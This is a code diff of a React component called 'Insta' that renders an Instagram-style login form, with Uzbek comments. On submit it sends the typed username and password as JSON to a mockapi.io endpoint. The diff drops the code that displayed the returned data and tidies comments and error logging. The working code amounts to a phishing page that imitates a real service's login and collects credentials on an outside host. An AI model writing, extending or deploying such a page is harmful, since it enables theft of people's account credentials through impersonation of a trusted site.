@@ -2,7 +2,6 @@ import React, { useState } from "react";
 
 const Insta = () => {
   const [form, setForm] = useState({ username: "", password: "" });
-  const [data, setData] = useState<any[]>([]);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setForm({ ...form, [e.target.name]: e.target.value });
@@ -11,20 +10,18 @@ const Insta = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     try {
-      const res = await fetch("https://687cc72c918b6422432f6d7d.mockapi.io/blog", {
+      await fetch("https://687cc72c918b6422432f6d7d.mockapi.io/blog", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(form),
       });
-      const result = await res.json();
-      setData((prev) => [...prev, result]);
 
-      // 🧼 INPUTNI TOZALASH
+      // Formani tozalash
       setForm({ username: "", password: "" });
     } catch (err) {
-      console.error("Yozishda xato");
+      console.error("Yozishda xato:", err);
     }
   };
 
@@ -36,7 +33,7 @@ const Insta = () => {
           <input
             type="text"
             name="username"
-            value={form.username} // ✅ Bu input bilan state bog'lanadi
+            value={form.username}
             onChange={handleChange}
             placeholder="Phone number, username, or email"
             className="w-full px-3 py-2 border rounded-sm text-sm border-gray-300 focus:outline-none"
@@ -45,7 +42,7 @@ const Insta = () => {
           <input
             type="password"
             name="password"
-            value={form.password} // ✅ Bu input bilan state bog'lanadi
+            value={form.password}
             onChange={handleChange}
             placeholder="Password"
             className="w-full px-3 py-2 border rounded-sm text-sm border-gray-300 focus:outline-none"
